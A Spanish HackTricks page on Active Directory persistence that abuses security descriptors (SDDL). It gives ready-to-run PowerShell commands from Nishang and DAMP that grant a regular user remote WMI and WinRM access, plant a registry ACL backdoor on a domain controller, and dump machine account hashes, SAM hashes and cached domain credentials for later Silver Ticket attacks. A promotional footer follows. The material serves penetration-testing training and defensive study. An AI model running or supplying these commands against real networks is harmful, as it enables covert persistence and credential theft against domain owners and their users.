# Descriptores de seguridad

El lenguaje de definición de descriptores de seguridad (SDDL) define el formato que se utiliza para describir un descriptor de seguridad. SDDL utiliza cadenas ACE para DACL y SACL: `tipo_de_ace;banderas_de_ace;permisos;object_guid;inherit_object_guid;account_sid;`

Los **descriptores de seguridad** se utilizan para **almacenar** los **permisos** que un **objeto** tiene **sobre** otro **objeto**. Si se puede hacer **un pequeño cambio** en el **descriptor de seguridad** de un objeto, se pueden obtener privilegios muy interesantes sobre ese objeto sin necesidad de ser miembro de un grupo privilegiado.

Entonces, esta técnica de persistencia se basa en la habilidad de obtener todos los privilegios necesarios contra ciertos objetos, para poder realizar una tarea que normalmente requiere privilegios de administrador pero sin necesidad de ser administrador.

### Acceso a WMI

Se puede dar a un usuario acceso para **ejecutar WMI de forma remota** [**usando esto**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Acceso a WinRM

Dar acceso a la **consola de PS de winrm a un usuario** [**usando esto**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Acceso remoto a hashes

Acceda al **registro** y **dumpee los hashes** creando una **puerta trasera de registro usando** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** para que en cualquier momento pueda recuperar el **hash de la computadora**, el **SAM** y cualquier **credencial AD en caché** en la computadora. Por lo tanto, es muy útil otorgar este permiso a un **usuario regular contra un equipo del Controlador de Dominio**:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Revisa [**Silver Tickets**](silver-ticket.md) para aprender cómo puedes utilizar el hash de la cuenta de equipo de un Controlador de Dominio.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
